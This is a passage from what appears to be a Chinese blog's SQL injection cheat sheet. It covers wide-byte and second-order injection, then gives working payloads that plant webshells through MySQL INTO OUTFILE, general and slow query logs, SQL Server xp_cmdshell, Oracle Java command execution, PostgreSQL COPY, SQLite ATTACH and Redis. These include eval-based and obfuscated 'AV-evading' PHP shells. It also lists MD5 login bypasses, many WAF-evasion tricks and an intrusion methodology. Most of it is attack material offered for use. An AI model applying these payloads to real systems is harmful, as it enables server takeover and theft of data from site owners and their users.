class="hljs-number">2</span>，<span class="hljs-number">0</span>），（<span class="hljs-number">2</span>，<span class="hljs-number">1</span>），（<span class="hljs-number">3</span>，<span class="hljs-number">0</span>），（<span class="hljs-number">3</span>，<span class="hljs-number">1</span>），（<span class="hljs-number">4</span>，<span class="hljs-number">0</span>），（<span class="hljs-number">4</span>，<span class="hljs-number">1</span>）&#125;；<br>数据库表连接数据行匹配时所遵循的算法就是以上提到的笛卡尔积，表与表之间的连接可以看成是在做乘法运算<br>select * from guestbook <span class="hljs-keyword">join </span>users<br></code></pre></td></tr></table></figure><p>Get_lock</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Select</span> GET_LOCK(<span class="hljs-symbol">&#x27;snowwolf</span>&#x27;,<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><p>Rlike</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">select concat (<span class="hljs-name">rpad</span> (<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad (<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a) ,rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a)<br>,rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a)<br>,rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rp<br>ad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a) ,rpad (<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a )) RLIKE &#x27;(a.*)+(a.*)+<br>(<span class="hljs-name">a</span>.*)+(a.*)+(<span class="hljs-name">a</span>.*)+(a.*)+(<span class="hljs-name">a</span>.*)+b&#x27;;<br></code></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-comment">;select</span><br></code></pre></td></tr></table></figure><h3 id="基于类型"><a href="#基于类型" class="headerlink" title="基于类型"></a>基于类型</h3><p>字符串型，数字型</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），也就是说一次性会读取两个字节。</p><p>简单来说，宽字节注入就是将两个ascii字符误认为是一个宽字节字符。</p><p>然而，**除了GBK的存在，转义字符**也是可以构成此漏洞的因素。</p><p><strong>当ascii码大于127的字符和转义字符\组成宽字节字符，会造成单引号或者双引号逃逸，进而导致sql注入。</strong></p><p>产生宽字节注入的原因涉及了编码转换的问题，当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字，那么如果存在过滤我们输入的函数（addslashes()、mysql_real_escape_string()、mysql_escape_string()、Magic_quotes_gpc）会将我们的输入进行转义。</p><p>尝试注入，我们举一个简单的例子：</p><p>addslashes()：该函数的作用是返回在预定义字符之前添加反斜杠的字符串。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%bf</span><span class="hljs-variable">%27</span><br><span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><br><span class="hljs-variable">%A8</span><span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure><h3 id="基于顺序"><a href="#基于顺序" class="headerlink" title="基于顺序"></a>基于顺序</h3><p>一次注入，二次注入</p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>注册或更新个人资料如下</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">I love programming&#x27;, email=(<span class="hljs-keyword">SELECT</span> email <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>) --<br></code></pre></td></tr></table></figure><p>当执行SQL语句时，会发生以下情况：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">末尾的注释<span class="hljs-comment">--可确保原始 SQL 查询的其余部分被注释掉</span><br>子查询(<span class="hljs-keyword">SELECT</span> email <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>）将执行用管理员用户的电子邮件替换该列<br></code></pre></td></tr></table></figure><h3 id="基于注入点"><a href="#基于注入点" class="headerlink" title="基于注入点"></a>基于注入点</h3><p>表单，cookie，http头部字段</p><h2 id="SQL注入基本流程"><a href="#SQL注入基本流程" class="headerlink" title="SQL注入基本流程"></a>SQL注入基本流程</h2><p>寻找注入位置，判断注入点，识别数据库，注数据&#x2F;拿权限</p><h3 id="寻找注入位置"><a href="#寻找注入位置" class="headerlink" title="寻找注入位置"></a>寻找注入位置</h3><p>与数据库可能有交互的地方都存在sql注入</p><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>公式：</p><p>闭合符号+逻辑符号+逻辑语句+注释符号</p><h4 id="闭合符号"><a href="#闭合符号" class="headerlink" title="闭合符号"></a>闭合符号</h4><p>; ) ‘ “ ‘) “)</p><h4 id="逻辑符号"><a href="#逻辑符号" class="headerlink" title="逻辑符号"></a>逻辑符号</h4><p>and or | &amp; || &amp;&amp;</p><h4 id="逻辑语句"><a href="#逻辑语句" class="headerlink" title="逻辑语句"></a>逻辑语句</h4><p>+-*&#x2F;&lt;&gt;</p><h4 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h4><p>– -,–+,#</p><h2 id="其它知识点"><a href="#其它知识点" class="headerlink" title="其它知识点"></a>其它知识点</h2><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h4 id="outfile和dumpfile写shell"><a href="#outfile和dumpfile写shell" class="headerlink" title="outfile和dumpfile写shell"></a>outfile和dumpfile写shell</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>过滤了单引号into outfile还能用吗？不能，GPC要off才行，可以测试Hex编码</p><blockquote><ol><li>数据库当前用户为root权限；</li><li>知道当前网站的绝对路径；</li><li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li><li>写入的那个路径存在写入权限。</li></ol></blockquote><h6 id="基于UNION联合查询："><a href="#基于UNION联合查询：" class="headerlink" title="基于UNION联合查询："></a><strong>基于UNION联合查询</strong>：</h6><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 UNION ALL SELECT 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into outfile &#x27;C:\info.php&#x27;%23</span><br><span class="language-xml">?id=1 UNION ALL SELECT 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into dumpfile &#x27;C:\info.php&#x27;%23</span><br></code></pre></td></tr></table></figure><h6 id="非联合查询"><a href="#非联合查询" class="headerlink" title="非联合查询"></a><strong>非联合查询</strong></h6><p>当我们无法使用联合查询时，我们可以使用<code>fields terminated by</code>与<code>lines terminated by</code>来写shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 into outfile &#x27;C:\info.php&#x27; FIELDS TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br></code></pre></td></tr></table></figure><p><strong>代替空格的方法</strong><br>+号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、 &#x2F;**&#x2F; 注释符等<br><code>outfile</code>和<code>dumpfile</code>的区别</p><p><code>outfile</code>:</p><blockquote><p>1、 支持多行数据同时导出</p><p>2、 使用union联合查询时，要保证两侧查询的列数相同</p><p>3、 会在换行符制表符后面追加反斜杠</p><p>4、会在末尾追加换行</p></blockquote><p><code>dumpfile</code>:</p><blockquote><p>1、 每次只能导出一行数据</p><p>2、 不会在换行符制表符后面追加反斜杠</p><p>3、 不会在末尾追加换行</p></blockquote><p>因此，我们可以使用<code>into dumpfile</code>这个函数来顺利写入二进制文件;</p><p>当然<code>into outfile</code>函数也可以写入二进制文件，只是最终无法生效罢了（追加的反斜杠会使二进制文件无法生效）</p><p>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<code>dump file</code>，应该手动添加 limit 限制</p><h4 id="突破secure-file-priv写shell"><a href="#突破secure-file-priv写shell" class="headerlink" title="突破secure-file-priv写shell"></a>突破<code>secure-file-priv</code>写shell</h4><p><code>MySQL</code>的<code>secure-file-priv</code>参数是用来限制LOAD DATA, SELECT … <code>OUTFILE</code>, and LOAD_FILE()传到哪个指定目录的。</p><p>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>MySQL</code>的导入|导出做限制，如果是null，表示<code>MySQL</code>不允许导入导出。</p><p>而且在<code>mysql 5.6.34</code>版本以后 <code>secure_file_priv</code> 的值默认为NULL。并且无法用<code>SQL</code>语句对其进行修改。</p><h4 id="基于日志写shell"><a href="#基于日志写shell" class="headerlink" title="基于日志写shell"></a><strong>基于日志写shell</strong></h4><p>（ <code>outfile</code>被禁止，或者写入文件被拦截，没写权限 ，有root权限）</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">show variables like &#x27;%general%&#x27;;--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="language-xml">set global general_log = on;--开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="language-xml">set global general_log_file = &#x27;/var/www/html/info.php&#x27;;--设置日志路径</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;--执行查询，写入shell</span><br><span class="language-xml">--结束后，恢复日志路径，关闭日志监测</span><br><span class="language-xml"></span><br><span class="language-xml">--SQL查询免杀shell</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$sl</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;klion&#x27;</span>]);<span class="hljs-variable">$sl</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;pffff&#x27;</span>=&gt;<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>=&gt;<span class="hljs-string">&#x27;fffff&#x27;</span>,<span class="hljs-string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;nnnnn&#x27;</span>=&gt;<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>];<span class="hljs-variable">$_</span>= <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-variable">$_</span>.<span class="hljs-string">&#x27;rt&#x27;</span>;<span class="hljs-variable">$_</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure><h4 id="慢查询写shell"><a href="#慢查询写shell" class="headerlink" title="慢查询写shell"></a>慢查询写shell</h4><p>为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错<br>show variables like ‘%slow_query_log%’;–查看慢查询信息<br>set global slow_query_log&#x3D;1;–启用慢查询日志(默认禁用)<br>set global slow_query_log_file&#x3D;’C:\phpStudy\WWW\shell.php’;–修改日志文件路径<br>select ‘<?php @eval($_POST[abc]);?>‘ or sleep(11);–写shell</p><h5 id="慢查询补充"><a href="#慢查询补充" class="headerlink" title="慢查询补充"></a><strong>慢查询补充</strong></h5><p>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。</p><p>一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。</p><p>如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%long_query_time%&#x27;</span><span class="hljs-comment">--查看服务器默认时间值</span><br></code></pre></td></tr></table></figure><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<br><span class="hljs-keyword">select</span> <span class="hljs-number">0x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span><br><br><span class="hljs-keyword">Sql</span> server<br>存储过程xp_cmdshell<br>;<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; D:\\WWW\\2333.aspx&#x27;</span> ;<span class="hljs-comment">--</span><br><br>Oracle<br><span class="hljs-number">1</span>、创建JAVA包<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br><span class="hljs-number">2</span>、JAVA权限<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;begin dbms_java.grant_permission( &#x27;&#x27;&#x27;&#x27;SYSTEM&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;EXECUTE&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br><span class="hljs-number">3</span>、创建函数<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br>URL执行<br>id<span class="hljs-operator">=</span><span class="hljs-number">602</span><span class="hljs-string">&#x27;||utl_inadd.get_host_name((select LinxRUNCMD(&#x27;</span>cmd <span class="hljs-operator">/</span>c dir d:<span class="hljs-operator">/</span><span class="hljs-string">&#x27;) from dual))--</span><br><span class="hljs-string"></span><br><span class="hljs-string">postgresql</span><br><span class="hljs-string">COPY (select &#x27;</span><span class="hljs-operator">&lt;</span>?php phpinfo();?<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;) to &#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span><span class="hljs-number">1.</span>php<span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">sqlite3</span><br><span class="hljs-string">;attach database &#x27;</span>D:\\www\\<span class="hljs-number">008.</span>php<span class="hljs-string">&#x27; as tt;create TABLE tt.exp (dataz text) ; insert INTO tt.exp (dataz) VALUES (x&#x27;</span><span class="hljs-number">3</span>c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">redis</span><br><span class="hljs-string">%0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml2F%0D%0Aconfig%20set%20dbfilename%20shell%2Ephp%0D%0Aset%20x%2022%3C%3Fphp%20phpinfo%28%29%3B%%203F%3E%22%0D%0Asave%0D%0A</span><br></code></pre></td></tr></table></figure><p>当然如果你懒得手动打，你直接sqlmap后面加个–os-shell就行</p><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><h4 id="MD5万能密码"><a href="#MD5万能密码" class="headerlink" title="MD5万能密码"></a>MD5万能密码</h4><p>select * from ‘admin’ where password&#x3D;md5($pass,true)</p><p>这里面password就是我们用户框中输入得东西。如果通过md5之后返回字符串是’or 1的话，形成一个永真条件，</p><p>select * from ‘admin’ where password&#x3D;’  ‘or  ‘6…’</p><p>看了大佬博客，这个可以用ffifdyop绕过，绕过原理是： ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6 而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D;’’ or ‘6xxxxx’，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p><h3 id="通配符注入"><a href="#通配符注入" class="headerlink" title="通配符注入"></a>通配符注入</h3><p>在 SQL 中，LIKE是一个强大的匹配操作符，用于在WHERE子句中对列名进行模糊搜索，它通常与通配符一起使用，以提供更灵活的匹配条件。</p><p>通配符是一种特殊字符，用于在搜索或匹配字符串时表示一个或多个真正的字符。在SQL中，LIKE操作符经常与两个通配符（%和_）一起使用，以提供更灵活的匹配条件。</p><p>百分号（%）表示零个或任意个字符，可以匹配任意类型和长度的字符，包括中文等非ASCII字符。下划线（_）则表示任意单个字符，匹配单个任意字符，通常用来限制表达式的字符长度。</p><h1 id="SQLBypass"><a href="#SQLBypass" class="headerlink" title="SQLBypass"></a>SQLBypass</h1><h2 id="HTTP协议绕过"><a href="#HTTP协议绕过" class="headerlink" title="HTTP协议绕过"></a>HTTP协议绕过</h2><h3 id="1-协议未覆盖"><a href="#1-协议未覆盖" class="headerlink" title="1.协议未覆盖"></a>1.协议未覆盖</h3><p>WAF未能覆盖Content-Type，从而导致被绕过。或者WAF认为这是一个文件上传请求，从而只检测文件上传，导致绕过<br>POST请求：<br>Content-Type:application&#x2F;x-www-from-urlencoded<br>Content-Type:multipary&#x2F;from-data<br>Content-Type:application&#x2F;json<br>Content-Type:application&#x2F;xml</p><h3 id="2-HTTP-1-x与HTTP-2差异绕过WAF-对云WAF无效"><a href="#2-HTTP-1-x与HTTP-2差异绕过WAF-对云WAF无效" class="headerlink" title="2.HTTP&#x2F;1.x与HTTP&#x2F;2差异绕过WAF(对云WAF无效)"></a>2.HTTP&#x2F;1.x与HTTP&#x2F;2差异绕过WAF(对云WAF无效)</h3><p>HTTP&#x2F;2提供了更高效的传输方式和更多的特性，WAF可能没有对HTTP&#x2F;2协议请求进行充分检测或者不支持HTTP&#x2F;2</p><h3 id="3-分块编码传输"><a href="#3-分块编码传输" class="headerlink" title="3.分块编码传输"></a>3.分块编码传输</h3><p>chunked-coding-converter</p><h3 id="4-HTTP参数污染绕过"><a href="#4-HTTP参数污染绕过" class="headerlink" title="4.HTTP参数污染绕过"></a>4.HTTP参数污染绕过</h3><p>TP参数污染，也叫HPP（HTTP Parameter Pollution）。当给一个参数赋两个值或者更多的值时，服务器对多次赋值参数的数据处理也是不同的，根据这个特征，可以对某些防护设备进行绕过。</p><p>这里后端取值是第3位的id，如果waf 取值是第一位检测那么就会导致绕过。</p><h3 id="5-HTTP参数溢出绕过"><a href="#5-HTTP参数溢出绕过" class="headerlink" title="5.HTTP参数溢出绕过"></a>5.HTTP参数溢出绕过</h3><p>WAF为了避免参数污染的绕过会检测所有的参数，但是有些WAF因为性能会有数量限制，如果WAF只检测前500个参数，攻击者可以将参数数量增加到501个，所有参数都使用不相同的参数名。<br>由于WAF只检测前500个参数，第501个参数就可以绕过WAF的检测。</p><h2 id="大小写混写绕过"><a href="#大小写混写绕过" class="headerlink" title="大小写混写绕过"></a>大小写混写绕过</h2><p>有些WAF默认情况下可能是大小写敏感的，因此这种方式可能会绕过检测。正则被绕过：<br>比如：<br><code>他的正则是union.*？select</code><br>你的payload是：UnIon sElect<br>就可以被绕过</p><h2 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h2><p>在某些情况下，特定的函数方法或正则表达式可能会替换或删除其中的关键字，比如：uniunionon selselectect ，它后端的过滤函数会根据正则去清洗掉，这个时候就会还原成union select，需要注意的是他可能会递归的删除且有一定的次数，比如ununionunionunionunionunionion 最后还原成union，这时候递归最大深度为5，也就是说最后payload 是需要替换5次</p><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>使用反引号，可以用来过空格和正则</p><p>`updatexml`(1,1,1)</p><p>科学计数法利用来做连接符号可以的躲避union select等组合规则</p><p>select 1,2 and 1&#x3D;1.e5union select 1,2</p><p>select后面可以接一些（+,-,!,~,”,’）特殊字符来干扰waf对select 1,2,3 的拦截</p><p>select~1,2,3</p><p>select!1,2,3</p><p>select-1,2,3</p><p>select+1,2,3</p><p>select”1”,2,3</p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p>十六进制，unicode，url</p><p>select * from users where username&#x3D;0x十六进制字符</p><h2 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h2><p>空格被过滤时可以使用注释&#x2F;**&#x2F;,内联注释&#x2F;<em>!12345</em>&#x2F;,– +xxx%0a,%23xxxx%0a, %09,%0A,%0C,%0D,%20 这些字符去替代.<br>过滤or and 可以使用逻辑运算符替代<br>and &#x3D; &amp;&amp;<br>or &#x3D; ||<br>有些场景过滤了逗号，导致无法使用部分函数，比如<br>substr(“123”,1,1); 过滤了,导致无法使用，我可以使用</p><p>from pos for len来取代substr(“123” from 1 for 1)</p><p>当database(),version(),user()等系统函数被过滤的场景可以使用@@ version，@@user等方式替换database可以采用内联注释或结合特殊字符来绕过。</p><p>当if等判断条件无法使用的时候，去寻找可用的对比函数，<br>比如locate 。<br>LOCATE 函数用于查找一个子字符串在另一个字符串中的位置。</p><p>当字符截取函数被禁用的场景下可以使用between and操作符 来进行盲注。<br>操作符 BETWEEN … AND 会选取介于两个值之间的数据范围。<br>可以按照abcdefghyjklmnopqrstuvwsyz 的范围盲枚举字符</p><p>Trim的艺术。<br>trim函数可以过滤指定的字符串：<br>完整格式：TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM] str)<br>简化格式：TRIM([remstr FROM] str)<br>BOTH 表示从字符串的开头和结尾去除，LEADING 表示从字符串的开头去除，<br>TRAILING 表示从字符串的结尾去除。如果未指定，默认为 BOTH。</p><p>Bypass information_schema<br>当information_schema被拦截的时候可以尝试<br>sys.schema_auto_increment_columns<br>sys.schema_table_statistics_with_buffer<br>select group_concat(table_name) from sys.schema_auto_increment_columns where<br>table_schema&#x3D;database()<br>select group_concat(table_name) from sys.schema_table_statistics_with_buffer where<br>table_schema&#x3D;database()<br>类似的表还有 mysql.innodb_table_stats、mysql_innodb_table_index都存放有库名和表名<br>限制条件<br>数据库版本要大于5.7<br>权限问题：要求权限高，root用户才能够访问<br>也可以使用另一个库performance_schema<br>select GROUP_CONCAT(OBJECT_NAME) from<br>performance_schema.table_io_waits_summary_by_table where OBJECT_SCHEMA&#x3D;database()</p><h2 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h2><p>iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，</p><p>解析出来还是select<br>iis+asp 的unicode特性 :iis支持Unicode的解析 我们传入<br>s%u0065lect解析为select</p><p>HPP参数污染</p><p>很多后端语言的json解析器会对特定编码做解析，可以<br>尝试utf-7, Unicode等编码做操作</p><h2 id="缓冲溢出"><a href="#缓冲溢出" class="headerlink" title="缓冲溢出"></a>缓冲溢出</h2><p>WAF在处理payload时超出了其缓冲区长度，可能就会引发崩溃之类的从而实现绕过</p><p>select 1 and (select 1)&#x3D;(select 0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*0xB*) UnIoN SeLect 1</p><p>select 1 and (select 1)&#x3D;(select 0xB*9999999999999999999999999) UnIoN SeLect 1</p><h1 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h1><h2 id="伪静态的区分"><a href="#伪静态的区分" class="headerlink" title="伪静态的区分"></a>伪静态的区分</h2><p>在浏览器里控制台（console),输入代码或粘贴js代码</p><p>alert(document.lastModified); 回车执行，会弹出一个弹窗。</p><p>重新刷新网页，再用相同的方法在控制台里输入查询代码，再查看文件的最后修改时间，如果发现<strong>时间不同</strong>则可以判断它是伪静态。（时间不是现在也很有可能）</p><p>如果是伪静态页面，可以尝试将其变成动态页面。伪静态的话只是由动态转成了静态，从地址上你是可以看到转递参数的，比如phpweb，它的链接是这样的：news&#x2F;?123.html，这个你可以理解成news.php?id&#x3D;123。所以你可以news&#x2F;?123*.html这样提交。或者可以进行伪静态中转。</p><p><a href="https://www.cnblogs.com/jsq16/p/5942003.html#:~:text=%E4%BC%AA%E9%9D%99%E6%80%81%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93.">伪静态注入的总结 - 无法自拔 - 博客园 (cnblogs.com)</a></p><h2 id="入侵的大概思维方式"><a href="#入侵的大概思维方式" class="headerlink" title="入侵的大概思维方式"></a>入侵的大概思维方式</h2><p>对搜索框进行测试（注入测试） 对登录处进行测试（万能密码、注入） 对站点进行目录扫描（发现其他突破口） 从C段下手</p><h3 id="一：中转注入法"><a href="#一：中转注入法" class="headerlink" title="一：中转注入法"></a>一：中转注入法</h3><p>1.通过<a 